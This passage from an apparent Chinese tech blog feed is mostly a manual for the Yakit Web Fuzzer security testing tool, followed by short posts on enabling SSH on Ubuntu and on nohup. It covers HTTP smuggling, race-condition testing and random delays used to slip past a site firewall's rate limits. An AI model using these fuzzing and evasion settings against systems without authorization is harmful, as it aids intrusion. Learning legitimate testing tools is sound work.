Fuzzer就会使用我们手动指定的真实Host来进行通信，这在Host碰撞的场景下非常有用。</p><h3 id="12-3-4-设置代理"><a href="#12-3-4-设置代理" class="headerlink" title="12.3.4 设置代理"></a>12.3.4 设置代理</h3><p>默认情况下，Web Fuzzer会走系统代理来进行发包。但是有时候我们需要手动指定代理，这时候我们就可以填写<strong>设置代理</strong>，这样Web Fuzzer就会使用我们手动指定的代理来进行通信，这在访问内网服务的场景下非常有用。在指定多个代理的情况下，Web Fuzzer会智能找到可用的代理进行请求。</p><h3 id="12-3-5-禁用系统代理"><a href="#12-3-5-禁用系统代理" class="headerlink" title="12.3.5 禁用系统代理"></a>12.3.5 禁用系统代理</h3><p>默认情况下，Web Fuzzer会走系统代理来进行发包。但是有时候我们不想使用系统代理，或者说这次发包不应该走系统代理，这时候我们就可以开启<strong>禁用系统代理</strong>选项。</p><h3 id="12-3-6-响应数量限制"><a href="#12-3-6-响应数量限制" class="headerlink" title="12.3.6 响应数量限制"></a>12.3.6 响应数量限制</h3><p>响应数量限制用于限制页面中最多渲染多少个请求响应，这个限制是由于请求响应过多时可能会对前端渲染造成一定的压力，所以需要对其进行限制。限制后如果想要查看所有响应，可以点击<strong>查看全部</strong>按钮：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2017.05.52.png" style="zoom:50%;"><h3 id="12-3-7-响应体长度限制"><a href="#12-3-7-响应体长度限制" class="headerlink" title="12.3.7 响应体长度限制"></a>12.3.7 响应体长度限制</h3><p>响应体长度限制用于限制页面中最多渲染的最长响应长度，这个限制是由于响应过大时可能会对前端渲染造成一定的压力，所以需要对其进行限制。当响应长度超过限制时，Web Fuzzer 会自动截断响应体，并显示超大响应，如果想要查看完整响应，可以点击<strong>完整响应</strong>按钮，在本地查看：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2017.10.38.png" style="zoom:50%;"><h2 id="12-4-请求包配置"><a href="#12-4-请求包配置" class="headerlink" title="12.4 请求包配置"></a>12.4 请求包配置</h2><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2017.11.58.png" style="zoom:50%;"><h3 id="12-4-1-Fuzztag-辅助"><a href="#12-4-1-Fuzztag-辅助" class="headerlink" title="12.4.1 Fuzztag 辅助"></a>12.4.1 Fuzztag 辅助</h3><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2017.13.20.png" style="zoom:50%;"><p>这也是一个用于辅助我们构造 Fuzztag 的工具。我们可以选择一些基础fuzztag，然后对他进行修改，查看生成后的 payload ，并且还可以将其添加到<strong>插入标签</strong>悬浮框的常用标签中。</p><h3 id="12-4-2-渲染-Fuzz"><a href="#12-4-2-渲染-Fuzz" class="headerlink" title="12.4.2 渲染 Fuzz"></a>12.4.2 渲染 Fuzz</h3><p>默认情况下，<strong>渲染 Fuzz</strong>选项是打开并选中标准模式的。 三个模式的区别如下：</p><ol><li>关闭：关闭该选项之后，所有的 Fuzztag 就会失效。这在我们不需要Fuzz标签而且与某些模板引擎语法冲突的情况下非常有用。</li><li>标准：标准模式下，Web Fuzzer 会对请求包中的Fuzz标签进行渲染，每个 Fuzztag 必须严格符合<code>{{tagname1({{tagname2(param)}})}}</code>的格式。</li><li>兼容：兼容模式下，Web Fuzzer 会对请求包中的Fuzz标签进行渲染，在嵌套fuzztag的情况下，我们可以省略多余的花括号，例如：<code>{{tagname1(tagname2(param))}}</code>。</li></ol><h3 id="12-4-3-不修复长度"><a href="#12-4-3-不修复长度" class="headerlink" title="12.4.3 不修复长度"></a>12.4.3 不修复长度</h3><p>默认情况下，Web Fuzzer会对请求包进行一些修复，其中也会对<code>Content-Length</code>请求头进行修复。我们知道，在数据包完全正确的情况下，<code>Content-Length</code>请求头的值应该等于请求体的长度，但是一般情况下我们修改了请求体之后不可能手动去计算<code>Content-Length</code>的值，这时候Web Fuzzer就会自动修复<code>Content-Length</code>的值。但是有时候我们可能遇到HTTP走私的情况或者不希望Web Fuzzer修复长度，这时候我们就可以开启<strong>不修复长度</strong>选项。     </p><h3 id="12-4-4-超时时长"><a href="#12-4-4-超时时长" class="headerlink" title="12.4.4 超时时长"></a>12.4.4 超时时长</h3><p>即每个请求的超时时间，单位为秒。在请求超时时，Web Fuzzer会自动返回并提示请求超时的错误。</p><h3 id="12-4-5-批量目标"><a href="#12-4-5-批量目标" class="headerlink" title="12.4.5 批量目标"></a>12.4.5 批量目标</h3><p>批量目标在你要对多个目标进行测试时非常有用。我们可以通过手动输入或者上传文件的方式来指定多个目标，这些目标之间用英文逗号或换行符分隔：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2017.20.12.png" style="zoom:50%;"><h2 id="12-5-并发配置"><a href="#12-5-并发配置" class="headerlink" title="12.5 并发配置"></a>12.5 并发配置</h2><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2017.21.48.png" style="zoom:50%;"><h3 id="12-5-1-重复发包"><a href="#12-5-1-重复发包" class="headerlink" title="12.5.1 重复发包"></a>12.5.1 重复发包</h3><p>重复发包一般用于测试条件竞争或者大并发的情况。填写<strong>重复发包</strong>的值（后续称之为n）后，Web Fuzzer会重复发包n次。这实际上也是通过添加了fuzztag标签实现的，其等价于在请求包的任意位置添加<code>{{repeat(n)}}</code>。</p><h3 id="12-5-2-并发线程"><a href="#12-5-2-并发线程" class="headerlink" title="12.5.2 并发线程"></a>12.5.2 并发线程</h3><p>在我们设置了fuzztag后，我们可能会发送不止一个数据包，此时我们可以通过填写<strong>并发线程</strong>的值控制用于并发的线程数量。这在我们需要进行快速并发测试或者请求网站的防火墙对访问速度有限制时非常有用。</p><h3 id="12-5-3-随机延迟"><a href="#12-5-3-随机延迟" class="headerlink" title="12.5.3 随机延迟"></a>12.5.3 随机延迟</h3><p>在我们并发请求网站的场景下，请求网站的防火墙可能会对访问速度有限制，此时我们可以通过设置<strong>随机延迟</strong>的Min和Max值，这样可以在每次请求之前延迟随机的时间（Min-Max秒），这可以在一定程度上通过请求网站的防火墙。</p><h2 id="12-6-重试配置"><a href="#12-6-重试配置" class="headerlink" title="12.6 重试配置"></a>12.6 重试配置</h2><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2017.31.07.png" style="zoom:50%;"><h3 id="12-6-1-重试次数"><a href="#12-6-1-重试次数" class="headerlink" title="12.6.1 重试次数"></a>12.6.1 重试次数</h3><p>在网络请求中，我们不可避免会遇到许多网络连通性的问题，比如服务器负载过高导致服务端错误（502状态码）或者网络波动导致请求失败，此时我们可以通过设置<strong>重试次数</strong>的值来控制Web Fuzzer重试的次数，这可以在一定程度上提高请求的稳定性。</p><h3 id="12-6-2-重试条件"><a href="#12-6-2-重试条件" class="headerlink" title="12.6.2 重试条件"></a>12.6.2 重试条件</h3><p><strong>重试条件</strong>配合重试次数使用。我们可以通过填写<strong>重试条件</strong>中状态码的值，设置其在响应什么状态码时进行重试。例如我们填写了<code>502,503</code>，则当响应状态码为502或者503时，Web Fuzzer会进行重试。</p><h3 id="12-6-3-不重试条件"><a href="#12-6-3-不重试条件" class="headerlink" title="12.6.3 不重试条件"></a>12.6.3 不重试条件</h3><p><strong>不重试条件</strong>配合重试次数使用。我们可以通过填写<strong>不重试条件</strong>中状态码的值，设置其在响应什么状态码时不进行重试。例如我们填写了<code>200,302</code>，则当响应状态码为200或者302时，Web Fuzzer不会进行重试。</p><p>无论如何，Web Fuzzer不会对30x的响应状态码进行重试。</p><h2 id="12-7-重定向配置"><a href="#12-7-重定向配置" class="headerlink" title="12.7 重定向配置"></a>12.7 重定向配置</h2><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2017.35.47.png" style="zoom:50%;"><h3 id="12-7-1-禁用重定向"><a href="#12-7-1-禁用重定向" class="headerlink" title="12.7.1 禁用重定向"></a>12.7.1 禁用重定向</h3><p>开启<strong>禁用重定向</strong>选项可以禁用请求时的自动重定向。这在我们需要测试重定向漏洞时非常有用。</p><h3 id="12-7-2-重定向次数"><a href="#12-7-2-重定向次数" class="headerlink" title="12.7.2 重定向次数"></a>12.7.2 重定向次数</h3><p><strong>重定向次数</strong>的值只有在关闭<strong>禁用重定向</strong>选项时生效。它表示的是在请求时最多允许重定向多少次。</p><h3 id="12-7-3-JS重定向"><a href="#12-7-3-JS重定向" class="headerlink" title="12.7.3 JS重定向"></a>12.7.3 JS重定向</h3><p>我们知道js一般通过调用<code>window.location.href</code>或者<code>window.location.replace</code>来进行页面的重定向。一般情况下这种重定向是无法跟踪的，这时候我们就需要开启<strong>JS重定向</strong>选项，来跟踪这种重定向。</p><h2 id="12-8-DNS配置"><a href="#12-8-DNS配置" class="headerlink" title="12.8 DNS配置"></a>12.8 DNS配置</h2><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2017.39.30.png" style="zoom:50%;"><h3 id="12-8-1-DNS服务器配置"><a href="#12-8-1-DNS服务器配置" class="headerlink" title="12.8.1 DNS服务器配置"></a>12.8.1 DNS服务器配置</h3><p><strong>DNS服务器</strong>用于指定本次请求使用的DNS服务器。在默认情况下，Web Fuzzer会使用系统的DNS服务器，但是有时候我们需要手动指定DNS服务器，这时候我们就可以填写<strong>DNS服务器</strong>的值，这在访问一些内网服务时非常有用。</p><h3 id="12-8-2-Hosts配置"><a href="#12-8-2-Hosts配置" class="headerlink" title="12.8.2 Hosts配置"></a>12.8.2 Hosts配置</h3><p><strong>Hosts配置</strong>可以直接添加host到ip的映射。这在指定的dns服务器都无法正常工作的情况下非常有用。</p><h2 id="12-9-WebFuzzer序列"><a href="#12-9-WebFuzzer序列" class="headerlink" title="12.9 WebFuzzer序列"></a>12.9 WebFuzzer序列</h2><h3 id="12-9-1-相关高级配置"><a href="#12-9-1-相关高级配置" class="headerlink" title="12.9.1 相关高级配置"></a>12.9.1 相关高级配置</h3><h4 id="1）匹配器"><a href="#1）匹配器" class="headerlink" title="1）匹配器"></a>1）匹配器</h4><ul><li>基本了解</li></ul><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2010.35.15.png" style="zoom:50%;"><p>一共有三种匹配模式：<strong>丢弃，保留，仅匹配</strong>。这三个模式很好理解：</p><ol><li>丢弃：丢弃模式会在符合匹配器时下丢弃返回包。</li><li>保留：保留模式会在符合匹配器时保留返回包，剩余的返回包则直接丢弃。</li><li>仅匹配：仅匹配模式会在符合匹配器时将对应的返回包染色，而不做其他操作。</li></ol><p>在匹配模式的旁边，有一个<strong>红色的圈</strong>，这里实际上是颜色按钮，用于设置在仅匹配模式下的染色颜色。</p><p>再往右看，有两个二选一按钮：<strong>AND和OR</strong>。这两个按钮用于设置多个数据提取器的匹配逻辑，AND表示所有匹配器的条件都需要匹配，OR表示只需要有其中一个条件匹配即可。</p><ul><li>添加方法</li></ul><p>我们点击下方的添加按钮或者上图中右上角的添加/调试按钮，就可以添加匹配器了。</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2010.41.23.png" style="zoom:50%;"><ul><li>使用方法</li></ul><p>匹配器给我们提供了多种匹配类型与匹配位置，方便我们编写复杂的匹配器。</p><p>匹配类型：</p><ol><li>关键字：关键字就是在匹配位置中匹配输入的关键字。</li><li>正则表达式：正则表达式就是在匹配位置中匹配输入的正则表达式。</li><li>状态码：（<strong>忽略匹配位置</strong>）状态码就是匹配响应的状态码，我们只需要填写希望匹配到的状态码即可。</li><li>十六进制：在某些情况下，希望匹配的字符串不是正常可见的ascii码，这时候你就可以使用十六进制这种匹配类型，输入十六进制字符串（例如字符串”302”对应十六进制字符串”333032”）。</li><li>表达式：（<strong>忽略匹配位置</strong>）表达式可以更加灵活地编写我们所希望的匹配规则，它还能与后续要讲的 高级配置：变量 联动。表达式的语法与nuclei-dsl语法兼容，熟悉nuclei工具的师傅可以尝试在表达式中编写一些复杂的匹配规则。一个匹配响应体中是否存在对应字符串的例子如下：<code>contains(body,'302 Found')</code>。</li></ol><p>匹配位置：（以下面这个响应包为例）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">HTTP/1.1 <span class="token number">302</span> FoundConnection: keep-aliveContent-Type: text/html<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>utf-8Location: https://www.baidu.com/Content-Length: <span class="token number">154</span><span class="token operator">&lt;</span>html<span class="token operator">&gt;</span><span class="token operator">&lt;</span>body<span class="token operator">&gt;</span><span class="token number">302</span> Found<span class="token operator">&lt;</span>/body<span class="token operator">&gt;</span><span class="token operator">&lt;</span>/html<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>状态码：匹配范围仅有状态码。</li><li>响应头：匹配范围包含响应的第一行（在例子是<code>HTTP/1.1 302 Found</code>）以及响应头。</li><li>响应体：匹配范围包含响应正文（在例子里是<code>&lt;html&gt;&lt;body&gt;302 Found&lt;/body&gt;&lt;/html&gt;</code>）。</li><li>全部响应：匹配范围即整个响应包。</li></ol><p>另外匹配器还包含**不匹配(取反)**这个选项，其意思是将匹配改为不匹配，这方便我们编写更复杂的匹配器。</p><h4 id="2）数据提取器"><a href="#2）数据提取器" class="headerlink" title="2）数据提取器"></a>2）数据提取器</h4><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2010.48.35.png" style="zoom:50%;"><p>数据提取器的功能是将响应包中的某些数据提取出来。</p><ul><li>添加数据提取器</li></ul><p>点击添加按钮即可</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2010.50.03.png" style="zoom:50%;"><p>数据提取器同样给我们提供了多种提取类型与提取位置，方便我们编写复杂的数据提取器。我们可以看到在数据提取器的左上角（data_0）旁边存在一个编写按钮，这是用于修改提取器的名字，这个名字可以在后续变量和Web Fuzzer序列中使用。</p><ul><li>提取类型</li></ul><ol><li>正则表达式：正则表达式就是在提取位置中提取输入的正则表达式匹配到的内容。我们知道在正则表达式中可以使用小括号来分组，这时候我们可以在<strong>匹配正则分组</strong>中选择分组，这样就可以提取到想要的内容了。(在正则表达式中,0分组即为正则表达式匹配到的所有内容)</li><li>XPath：（提取范围只能是<strong>响应体</strong>）XPath就是在提取位置中提取输入的XPath匹配到的内容。XPath是一种用于在XML文档中选择节点的语言，我们也可以很轻易地使用浏览器开发工具来复制完整的Xpath。</li><li>键值对：键值对的提取规则稍微有点复杂。键值对会尝试提取所有可能存在的json的key对应的value，以及所有形似<code>key=value</code>中value的值。如果提取位置包含响应头（提取范围为<strong>响应头</strong>或<strong>Raw</strong>），则他还会尝试提取响应头中的value值。另外还有两个特殊的键值对，分别为<code>proto</code>，<code>status_code</code>，分别对应响应的HTTP协议版本和响应状态码。</li><li>JQ(*)：（提取范围只能是<strong>响应体</strong>）jq是一种用于在JSON文档中选择节点的工具，其对应的文档教程<a href="https://jqlang.github.io/jq/manual/">在此</a>。</li><li>表达式：（<strong>忽略匹配位置</strong>）表达式与上面匹配器中的表达式相同，这里不再赘述。</li></ol><p>对于<strong>Xpath</strong>这种提取类型，我们以下面的例子做讲解：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2010.57.37.png" style="zoom:50%;"><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2010.57.52.png" style="zoom:40%;"><p>在上述例子中，我们在最下面一行中填入xpath：<code>/html/body/div[1]/p[2]/a</code>，此时如果点击<strong>调试执行</strong>，我们就可以拿到对应的a标签内容：<code>More information...</code>。假如我们在上面的<strong>Xpath 参数</strong>中填入<code>href</code>，我们就可以提取到a标签的href属性：</p><p><code>https://www.iana.org/domains/example</code>。</p><p>对于<strong>JQ</strong>这种提取类型，我们以下面的例子做讲解：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2010.59.32.png" style="zoom:50%;"><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2010.59.52.png" style="zoom:40%;"><p>在上述例子中，我们可以看到响应体是一段json。假如我们想提取headers中Content-Type的值，我们只需要使用<code>.headers.["Content-Type"]</code>即可。</p><h4 id="3）变量"><a href="#3）变量" class="headerlink" title="3）变量"></a>3）变量</h4><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2011.01.19.png" style="zoom:50%;"><p>在上述<strong>数据提取器</strong>小节中，我们提到数据提取器的名字可以在变量中使用，实际上就相当于我们赋值了一个变量。同样地，我们也可以直接在变量这个地方上直接赋值变量。</p><p>在上图中，我们可以设置变量名和变量值，变量可以在<strong>后续变量</strong>，<strong>Web Fuzzer序列</strong>和<strong>当前Web Fuzzer</strong>中使用。我们可以通过使用fuzztag：<code>{{params(变量名)}}</code>或<code>{{p(变量名)}}</code>来使用变量。</p><p>变量同样存在三种模式：<strong>nuclei</strong>，<strong>fuzztag</strong>，<strong>raw</strong>。</p><ol><li>nuclei：nuclei模式下，其变量值实际上是nuclei的表达式，可以调用绝大部分nuclei-dsl中包含的函数。需要注意的是，当你引用其他变量时，其的值都是string类型，所以可能需要手动进行类型转换。一个简单的例子如下：<code>{{int(a)+3}}</code>。</li><li>fuzztag：fuzzta模式下，其变量值实际上就是fuzztag，在值中使用fuzztag也会使得Web Fuzzer发送多个请求包。一个简单的例子如下：<code>{{int(1-2)}}</code>。</li><li>raw：raw模式下，变量值相当于你输入的字符串，不会被解析。</li></ol><h4 id="4）GET-参数-POST-参数-Cookie-Header"><a href="#4）GET-参数-POST-参数-Cookie-Header" class="headerlink" title="4）GET 参数 / POST 参数 / Cookie / Header"></a>4）GET 参数 / POST 参数 / Cookie / Header</h4><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2011.06.27.png" style="zoom:50%;"><p>这些配置放在一起讲解。设置了这些配置之后，Web Fuzzer会在发送请求包时添加对应的 GET 参数 / POST 参数 / Cookie / Header并且<strong>额外发送请求</strong>，每设置一个变量就会额外发送一次。</p><p>如果我们设置了 GET 参数变量:<code>a=b</code> 以及 Cookie: <code>c=d</code>，当我们点击发送请求时，一共发送了3个请求包，这三个请求包分别是：</p><ol><li>原始请求，没有应用任何参数变量。</li><li>应用了其中一个 GET 参数变量:<code>a=b</code>，额外发送了一个包含 GET 参数:<code>a=b</code>的请求。</li><li>应用了其中一个 Cookie 变量:<code>c=d</code>，额外发送了一个包含 Cookie:<code>c=d</code>的请求。</li></ol><p>同理，假如我们额外设置了一个 GET 参数变量:<code>e=f</code>，那么我们就会额外发送一个包含 GET 参数:<code>e=f</code>的请求。</p><ul><li>如果同一种参数设置了多个变量：如下</li></ul><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2011.10.38.png" style="zoom:50%;"><p>会发送三个请求包：</p><ol><li>GET /?a=b HTTP/1.1 </li><li>GET /?a=b&amp;c=d HTTP/1.1</li><li>GET / HTTP/1.1</li></ol><h3 id="12-9-2-Web-Fuzzer序列基础"><a href="#12-9-2-Web-Fuzzer序列基础" class="headerlink" title="12.9.2 Web Fuzzer序列基础"></a>12.9.2 Web Fuzzer序列基础</h3><p>Web Fuzzer 序列就是将多个 Web Fuzzer 节点串联起来，实现更复杂的逻辑与功能。例如我们需要先进行登录，然后再进行其他操作，这时候我们就可以使用 Web Fuzzer 序列功能。</p><p>Web Fuzzer序列如图所示，在最左侧有一个<strong>Fuzzer 序列</strong>按钮：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2011.13.30.png" style="zoom:50%;"><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2011.15.35.png" style="zoom:50%;"><p>当我们点击 <code>Fuzzer 序列</code> 按钮时，会将 <code>WF-[1]</code>这个子标签页组成一个序列，变成如下所示：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2011.16.01.png" style="zoom:50%;"><p>随后我们可以在 <code>Step [0]</code> 这个节点中，添加 <code>Web Fuzzer</code> 的标签页<code>WF-[1]</code>，这相当于序列中设置第一个节点的请求包为<code>WF-[1]</code>。</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2011.16.52.png" style="zoom:50%;"><p>我们还可以继续添加其他节点到序列中，只需要将其他标签页拖入序列中即可：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2011.17.50.png" style="zoom:50%;"><p>接着我们在 <code>WF-[1]</code> 中设置一个提取器规则，规则内容是提取键值为<code>Node1</code>的值，声明为 <code>get</code>变量。再设置一个变量 <code>node1</code>，内容是<code>我是节点1传来的值</code>：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2011.19.16.png" style="zoom:50%;"><p>然后我们在 <code>WF-[2]</code>中设置<code>WF-[1]</code>中声明的变量，假如此时我们直接发送请求，结果会为空，这是因为单独发送这一个请求，是没有<code>WF-[1]</code>中声明的变量的：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2011.20.00.png" alt="截屏2024-12-26 11.20.00" style="zoom:50%;"><p>最后我们使用 <code>Fuzzer</code> 序列功能尝试一下，在<code> WF-[1]</code>到<code>WF-[2]</code>的中间，开启<strong>继承变量</strong>选项(默认开启)，点击<code>开始执行</code>按钮，等待请求结束后，我们查看<code>WF-[2]</code>的响应，发现它已经成功使用了在<code>WF-[1]</code>中设置的变量：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-26%2011.22.22.png" style="zoom:50%;"><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ul><li><a href="https://yaklang.com/products/intro">https://yaklang.com/products/intro</a> 【官方文档】</li></ul>]]></content>
      
      
      <categories>
          
          <category> 攻防工具库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 攻防工具库 </tag>
            
            <tag> Yakit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu开启ssh服务</title>
      <link href="/2024/12/23/xi-tong-yun-wei/ubuntu-kai-qi-ssh-fu-wu/"/>
      <url>/2024/12/23/xi-tong-yun-wei/ubuntu-kai-qi-ssh-fu-wu/</url>
      
        <content type="html"><![CDATA[<h1 id="一、SSH简介"><a href="#一、SSH简介" class="headerlink" title="一、SSH简介"></a>一、SSH简介</h1><p>SSH（Secure Shell）是一种网络协议，用于在网络上的计算机之间加密数据传输，特别是远程登录和管理。以下是SSH服务的一些基本介绍：</p><ol><li><strong>加密通信</strong>：SSH提供了一个安全的通道，通过这个通道，数据传输过程中可以防止窃听和中间人攻击，确保数据的机密性和完整性。</li><li><strong>远程登录</strong>：用户可以通过SSH协议远程登录到服务器，执行命令和操作，就像直接在服务器上操作一样。</li><li><strong>端口转发</strong>：SSH支持端口转发功能，可以将本地端口转发到远程服务器，实现安全的数据传输。</li><li><strong>密钥认证</strong>：SSH支持基于密钥的认证机制，提供比传统的用户名和密码更安全的认证方式。</li><li><strong>命令执行</strong>：通过SSH，用户可以在远程服务器上执行命令，进行文件传输，以及管理服务和进程。</li><li><strong>安全性</strong>：SSH协议使用公钥加密技术，确保只有拥有正确密钥的用户才能访问服务器。</li><li><strong>兼容性</strong>：SSH客户端和服务器软件广泛支持多种操作系统，包括Linux、Unix、Windows等。</li><li><strong>配置管理</strong>：SSH常用于自动化脚本和配置管理工具，如Ansible、Puppet等，以安全地管理和部署服务器配置。</li><li><strong>隧道和VPN</strong>：SSH可以作为VPN的一种形式，创建安全的网络隧道，允许通过不安全的网络传输敏感数据。</li><li><strong>版本</strong>：SSH协议有两个主要版本，SSH1和SSH2，其中SSH2更为安全和流行，提供了更强的加密和更好的性能。</li></ol><p>SSH因其安全性和多功能性，成为网络通信中不可或缺的一部分，尤其在需要远程管理和数据安全传输的场景中。</p><p>同时，启用  SSH 将会允许你远程连接到你的系统，并且执行管理员任务。你将能够通过 <code>scp</code>和<code>sftp</code>安全传输文件。</p><h1 id="二、ubuntu启用ssh"><a href="#二、ubuntu启用ssh" class="headerlink" title="二、ubuntu启用ssh"></a>二、ubuntu启用ssh</h1><p>默认情况下，当 Ubuntu 最初被安装的时候，通过 SSH 进行远程访问是不被允许的。</p><h2 id="2-1-安装openssh-server"><a href="#2-1-安装openssh-server" class="headerlink" title="2.1 安装openssh-server"></a>2.1 安装openssh-server</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> openssh-server<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>当被提示时，输入你的密码并且按 Enter，继续安装。</p><h2 id="2-2-验证服务是否正在运行"><a href="#2-2-验证服务是否正在运行" class="headerlink" title="2.2 验证服务是否正在运行"></a>2.2 验证服务是否正在运行</h2><p>一旦安装完成，SSH 服务将会被自动启动。你可以验证 SSH 是否正在运行，输入：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl status <span class="token function">ssh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/23/xi-tong-yun-wei/ubuntu-kai-qi-ssh-fu-wu/%E6%88%AA%E5%B1%8F2024-12-23%2014.14.20.png" style="zoom:50%;"><h2 id="2-3-ssh登录"><a href="#2-3-ssh登录" class="headerlink" title="2.3 ssh登录"></a>2.3 ssh登录</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> sxk@192.168.155.31 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 系统运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 系统运维 </tag>
            
            <tag> ubuntu的ssh服务 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>进程后台管理</title>
      <link href="/2024/12/17/xi-tong-yun-wei/jin-cheng-hou-tai-guan-li/"/>
      <url>/2024/12/17/xi-tong-yun-wei/jin-cheng-hou-tai-guan-li/</url>
      
        <content type="html"><![CDATA[<h1 id="一、nohup"><a href="#一、nohup" class="headerlink" title="一、nohup"></a>一、nohup</h1><h2 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h2><p><code>nohup</code> 是一个命令行实用程序，用于在用户注销后继续运行命令。它的名字来源于 “no hang up”（不要挂断），意味着即使用户挂断（注销）了，命令也会继续执行。</p><h2 id="1-2-用法"><a href="#1-2-用法" class="headerlink" title="1.2 用法"></a>1.2 用法</h2><p>以下是 <code>nohup</code> 的一些关键特性和用法：</p><ol><li><p><strong>后台运行命令</strong>：</p><ul><li><code>nohup</code> 允许你运行一个命令，即使在终端关闭或用户注销后，该命令也会继续在后台运行。</li></ul></li><li><p><strong>忽略挂起信号</strong>：</p><ul><li>默认情况下，当终端会话结束时，所有的进程都会收到 <code>SIGHUP</code>（挂起信号），这会导致大多数程序终止。<code>nohup</code> 命令会忽略这个信号，使得进程可以继续运行。</li></ul></li><li><p><strong>输出重定向</strong>：</p><ul><li>如果你不指定输出文件，<code>nohup</code> 会将输出重定向到名为 <code>nohup.out</code> 的文件中。如果 <code>nohup.out</code> 文件已存在，输出会被追加到文件末尾。</li></ul></li><li><p><strong>使用示例</strong>：</p><ul><li><p>运行一个命令并忽略挂起信号：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nohup</span> some-command <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><ul><li><p>将输出重定向到特定文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nohup</span> 